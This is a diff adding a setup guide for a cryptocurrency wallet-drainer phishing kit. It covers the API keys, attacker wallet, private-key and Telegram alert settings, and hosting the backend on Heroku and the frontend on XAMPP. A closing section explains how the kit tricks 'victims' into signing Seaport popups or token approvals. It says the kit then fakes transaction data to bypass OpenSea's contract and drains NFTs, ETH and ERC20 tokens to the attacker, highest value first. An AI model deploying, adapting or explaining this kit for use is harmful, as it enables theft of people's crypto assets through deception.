@@ -1,0 +1,316 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2636
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\froman\fcharset0 Times-Bold;\f1\fnil\fcharset0 HelveticaNeue;\f2\fnil\fcharset0 HelveticaNeue-Bold;
+\f3\froman\fcharset0 Times-Roman;\f4\fnil\fcharset0 Menlo-Regular;\f5\fnil\fcharset0 AppleColorEmoji;
+\f6\froman\fcharset0 Times-Italic;}
+{\colortbl;\red255\green255\blue255;\red252\green107\blue24;\red255\green255\blue255;\red0\green0\blue0;
+\red253\green139\blue9;\red25\green60\blue255;\red251\green0\blue7;\red252\green138\blue8;\red251\green0\blue7;
+\red88\green138\blue67;\red255\green255\blue255;\red202\green202\blue202;\red202\green202\blue202;\red67\green179\blue255;
+\red71\green137\blue205;\red141\green213\blue254;\red203\green203\blue202;\red167\green197\blue151;}
+{\*\expandedcolortbl;;\cssrgb\c100000\c50592\c11135;\cssrgb\c100000\c100000\c99971\c0;\cssrgb\c0\c0\c0;
+\cssrgb\c100000\c61456\c0;\cssrgb\c12594\c35385\c100000;\cssrgb\c100000\c12195\c0;\cssrgb\c99704\c61080\c0;\cssrgb\c100000\c12195\c0;
+\cssrgb\c41525\c59950\c33208;\cssrgb\c100000\c100000\c100000\c0;\cssrgb\c83229\c83229\c83125;\cssrgb\c83137\c83137\c83137;\cssrgb\c31226\c75987\c100000;
+\cssrgb\c33936\c61427\c84130;\cssrgb\c61545\c86704\c99884;\cssrgb\c83320\c83320\c83112;\cssrgb\c71035\c80830\c65726;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww18220\viewh12360\viewkind0
+\deftab720
+\pard\pardeftab720\partightenfactor0
+
+\f0\b\fs38 \cf2 \cb3 \expnd0\expndtw0\kerning0
+\ul \ulc4 0.0. following API-Keys and things are needed:\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardeftab720\pardirnatural\partightenfactor0
+
+\f1\b0 \cf0 \cb1 \kerning1\expnd0\expndtw0 \ulnone \
+
+\f2\b 1x Covalenthq API KEY = 
+\f3\b0 \expnd0\expndtw0\kerning0
+COVAL_KEY (set this in frontend = utils.js)
+\f1 \kerning1\expnd0\expndtw0 \
+\'97> Go to: https://www.covalenthq.com/\
+\'97> Sign in\
+\'97> Get API Key\
+\
+
+\f2\b 1x Infura API KEY = 
+\f3\b0 \expnd0\expndtw0\kerning0
+WEB3_URL (set this in _BACKEND = constants.js)
+\f1 \kerning1\expnd0\expndtw0 \
+\'97> Go to: https://infura.io/\
+\'97> Sign in\
+\'97> Get API Key\
+\
+
+\f2\b Create a Wallet:
+\f1\b0 \
+\'97> 1x Wallet = CALLER_ADDR  = RECEIVER 
+\f3 \expnd0\expndtw0\kerning0
+(set this in _BACKEND = constants.js)
+\f1 \kerning1\expnd0\expndtw0 \
+\'97> 1x Private Key of NEW wallet = 
+\f3 \expnd0\expndtw0\kerning0
+CALLER_PK (set this in _BACKEND = constants.js)
+\f1 \kerning1\expnd0\expndtw0 \
+\'97> Send around 50$ to this CALLER_ADDR, because this wallet needs around 50$ for claiming and paying gas fee for draining - 2-5$ for each transaction (\'97> in 1 transaction it can be drained more than 1 NFT)\
+
+\f0\b \cf2 \cb3 \expnd0\expndtw0\kerning0
+\ul \
+\pard\pardeftab720\partightenfactor0
+\cf2 \
+######## \ulc2 0.1 INSTALL NPM/nodeJS  if not available on mashine:
+\f3\b0 \cf0 \cb1 \ulnone \
+\
+npm install -g npm\
+\
+\
+\pard\pardeftab720\partightenfactor0
+\cf5 \ul \ulc5 ######## 1) ADJUST SETTINGS:\cf0 \ulnone \
+\
+\cf6 ##BACKEND\cf0 \
+\cf6 _BACKEND/src/utils/constants.js\cf0 \
+\
+Set the following variables:\
+
+\f0\b \cf7 RECEIVER = CALLER
+\f3\b0 \cf0 \
+	RECEIVER		\'97> Wallet which receive the NFT = SHOULD BE THE CALLER_ADDR\
+	CALLER_ADDR	\'97> Wallet (should be the same wallet like RECEIVER) which is paying gas fee and sending NFT to receiver (using informations from the victim and bypassing the opens contract)\
+	CALLER_PK		\'97>  Private Key of CALLER_ADDR = PK OF RECEIVER/CALLER_ADD\
+	PORT			\'97> on localhost its 4000, but Port depends where you will host\
+					\'97> for example heroku \'84\cf9 export const PORT = process.env.PORT\cf0 \'93 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0\b\fs28 \cf0 For notifications: set telegram channel
+\f3\b0 \
+\cf9 (IMPORTANT AND NEEDED: OTHERWISE BACKEND-ERRORS during hosting!)\
+
+\f0\b \cf0 How to get TG_LINK + Channels?\
+\pard\pardeftab720\partightenfactor0
+
+\f4\b0\fs24 \cf10 \cb11 \
+1) Search for Botfather on Telegram. @ him at /@botfather\cf12 \
+\cf10 Say hi to the Botfather (gotta pay respects)\cf12 \
+\cf10 Send your bot name his way\cf12 \
+\cf10 Bam! You got your authorization token 
+\f5 \uc0\u55357 \u56835 \
+
+\f4 For
+\f5  
+\f4 example
+\f5  
+\f4 this:\cf12  \cf10 5568294789:AAEpjAec8qBZLgou_xUe_N4vySaS7PiBTaE\
+\cf13 \cb1 \
+\cf10 \cb11 2) Create a new group\
+3) Add the created bot to your group\
+4) Invite @RawDataBot to your group.\
+5) Get the Chat-\'84ID \'97> id": -220917654,\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f3\fs38 \cf0 \cb1 \
+For notifications: set telegram channel\
+	TG_TOKEN \
+	TG_LINK\
+	CHAT_ID_ERR\
+	CHAT_ID_CON\
+	CHAT_ID_APP\
+\
+Set infura API-Key:\
+	WEB3_URL\
+(Something like "https://mainnet.infura.io/v3/52affba2.............d3ff789338\'93;)\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0\b \cf6 ##FRONTEND\
+/js//utils.js
+\f3\b0 \cf0 \
+Set the following variables:\
+	RECEIVER 		\'97> wallet which receives assest\
+\
+	COVAL_KEY (your API-KEY from `https://api.covalenthq.com)\
+\
+	API_URL --> your BACKEND-URL where you hosted your BACKEND\
+	\
+\
+I added the variable 
+\f4\fs24 \cf14 \cb11 \'93seaportTesting\'93\
+\
+seaportTesting\cf12  = \cf15 true\cf12  \cf10 // false = PROD // true = for TESTING ONLY!
+\f3\fs38 \cf0 \cb1 \
+\pard\pardeftab720\partightenfactor0
+\cf9 \
+Set the variable to TRUE if you want, that all worthless NFT will also be drained and OpenSea-Popup is shown.\
+-> set it to FALSE if you run your drainer later and want to get victims NFT which have specific value:\
+Because the following collection.stats will be used to define it NFT has value or is worthless:\
+\pard\pardeftab720\partightenfactor0
+
+\f4\fs24 \cf16 \cb11 collection\cf17 .\cf16 stats\cf17 .\cf16 seven_day_volume\cf17  > \cf18 0\cf17 \
+\cf16 collection\cf17 .\cf16 stats\cf17 .\cf16 one_day_average_price\cf17  > \cf18 0\cf17  \cf13 \cb1 \
+\pard\pardeftab720\partightenfactor0
+
+\f3\fs38 \cf0 \
+\
+\
+#################### HOST BACKEND localhost ########################################\
+\pard\pardeftab720\partightenfactor0
+\cf5 ######## 1)\
+####### Hosting on LOCALHOST\cf0 \
+\
+1) in main folder (_BACKEND) \'97> check if you are in folder 
+\f6\i _BACKEND
+\f3\i0 \
+npm install\
+\
+2) in main folder (_BACKEND) \'97> check if you are in folder 
+\f6\i _BACKEND
+\f3\i0 \
+npm start\
+\
+3)\
+then change the api url in your frontend (js/utils.js)\
+its on port 4000\
+\
+const API_URL = "http://localhost:4000";  // CHANGE TO YOUR API_URL\
+\
+\
+####################.   HOST BACKEND on heroku.com ###################################\
+######## 2)\
+\cf5 #######  Hosting on real Webserver (for example \cf0 heroku\cf5 )\
+nodeJS HOSTING on server\cf0 \
+\
+Make sure the constants.js file has following setting for PORT:\
+\pard\pardeftab720\partightenfactor0
+\cf9 export const PORT = process.env.PORT // for example heroku hosting\cf0 \
+\
+\pard\pardeftab720\partightenfactor0
+\cf0 \ul \ulc0 How to host on heroku the nodeJS backend (on MacOS X)\ulnone \
+\
+\
+(Install git if not installed yet)\
+\
+Install the Heroku CLI\
+Download and install the Heroku CLI.\
+\
+$ brew tap heroku/brew && brew install heroku\
+\
+\'97> Create a Heroku account for free here. If you already have an account then log in and go to the dashboard.\
+https://signup.heroku.com/\
+\
+\'97> Create a new app:\
+\
+\'97> And enter a unique app name\
+(For example \'84TESTING_SEAPORT_YOUR_NAME\'93)\
+(Change the name)\
+\
+Now once the installation is successful you need to go to your server-side project and run the below command in the terminal.\
+\
+\'97> $ heroku login\
+\
+This will either redirect you to the browser or prompt for Heroku login credentials in the terminal once you are logged in successfully you are all set to deploy your code. Now initialize git repository inside your working directory and connect that to your Heroku app using the second command with your app name.\
+\
+\'97> $ git init \
+\'97> $ heroku git:remote -a unique-app-name-to-be-entered\
+(EXAMPLE: $ heroku git:remote -a TESTING_SEAPORT_YOUR_NAME)\
+\
+Now you can add and commit to the Heroku master branch using the following commands.\
+\
+\cf9 IMPORTANT: REMOVE THE node_modules folder BEFORE YOU add/commit/push the change from _BACKEND-folder \'97> heroku will install all dependencies itself on the server!\
+\cf0 \
+\'97> $ git add .\
+\'97> $ git commit -m "make it better"\
+\'97> $ git push heroku master \
+\
+\
+Check logs in terminal:\
+1)  \'97> $ heroku logs --tail --app TESTING_SEAPORT_YOUR_NAME\
+2)  \'97> $heroku logs --tail  \
+\
+\
+\
+####################.   FRONTEND on localhost #####################################\
+######## 3)\
+\pard\pardeftab720\partightenfactor0
+\cf5 #######  Hosting FRONTEND with XAMPP on localhost\
+\
+Install \cf0 XAMPP\
+\
+\
+put your all files and folders in htdocs folder. \
+\
+Suppose your folder name \'93myproject\'94 in htdocs folder. \
+\
+You can access your site url by typing following in browser: \
+\
+localhost/myproject\
+\
+\
+\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0\b\fs50 \cf6 Drainer Knowledge:\
+\pard\pardeftab720\partightenfactor0
+
+\f3\b0\fs38 \cf0 \
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardeftab720\pardirnatural\partightenfactor0
+
+\f2\b\fs40 \cf0 \kerning1\expnd0\expndtw0 \ul What assets will be drained?
+\fs32 \ulnone \
+
+\f1\b0 Its draining NFTs (Seaport Popup and/or sign), ETH (sign) and ERC20 tokens (sign). Highest value first!\
+
+\f2\b \
+\ul Is my NFT approved on opensea?\ulnone \
+
+\f1\b0 Check the link and enter your wallet-address which will be drained:
+\f2\b \
+
+\f1\b0 https://etherscan.io/tokenapprovalchecker?type=2\
+\
+(Check the ERC721 section)\
+
+\f2\b -> you need entry here for opensea conduit\
+\
+
+\fs40 \ul Requirements to drain NFT with Opens?
+\fs32 \ulnone \
+
+\f1\b0 We want to be sure not to drain worthless NFTs. That\'92s why we are asking OpenSea what\'92s the value of the NFT. The following parameters (
+\f2\b \ul stats
+\f1\b0 \ulnone ) needed to be greater than 0 (default setting). But this can be changed,
+\f2\b \
+
+\f1\b0 - one_day_average_price\
+- seven_day_volume\
+\
+To calculate the worth of the NFT we are always using the \'84one_day_average_price\'93!\
+\pard\pardeftab720\partightenfactor0
+
+\f3\fs38 \cf0 \expnd0\expndtw0\kerning0
+https://api.opensea.io/api.opensea.io/api/v1/collections?asset_owner=WALLET_ADDRESS&offset=0&limit=20\
+\
+\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardeftab720\pardirnatural\partightenfactor0
+
+\f2\b\fs40 \cf0 \kerning1\expnd0\expndtw0 \ul How is the Seaport-Drainer working?
+\f1\b0\fs32 \ulnone \
+It is checking connected Wallet of user:\
+\
+If user has NFT with approval on opensea conduit (and some other parameters like \'84seven_day_volume, one_day_average_price,\'85), the Seaport-popup will be shown (if no approval available -> Show red sign for SafeTransferFrom or SetApprovalForAll).\
+If user accept this --> all NFT will be drained with a \'84Caller-Wallet (which is set in the connected backend-server).\
+This is bypassing the Opensea contract and draining ALL NFT with 1 transaction. The Caller_Wallet is paying the gas fee and victim is not paying any cent.\
+\
+If user does not have NFTs with approval --> Normal NFT drain with SafeTransferFrom or setApprovalForAll will be used.\
+\
+Also ERC20 tokens and ETH will be fully drained with red sign.\
+\
+The sorting Algorithm is checking which asset has the highest value.\
+If for example the Wallet has 10 ETH and 2 NFTs with value of 0.5 ETH each -> The Drainer is just draining the FULL ETH first (highest value first).\
+\
+\
+
+\f2\b\fs40 \ul Technical Background Information:
+\f1\b0\fs32 \ulnone \
+If user accepts Seaport-Popup:\
+The Frontend is sending all informations of relevant NFTs from victim to backend-server.\
+The backend has a CALLER_WALLET with CALLER_PK (PrivateKey) and needs some $ for paying gas fee.\
+The backend is technically faking some transaction data (sender, receiver, signature, worth, sig,\'85) and is bypassing the official opensea contract and is transferring automatically all NFT to RECEIVER wallet.\
+(Backend is also used to hide the PrivateKey of the CALLER_WALLET).}
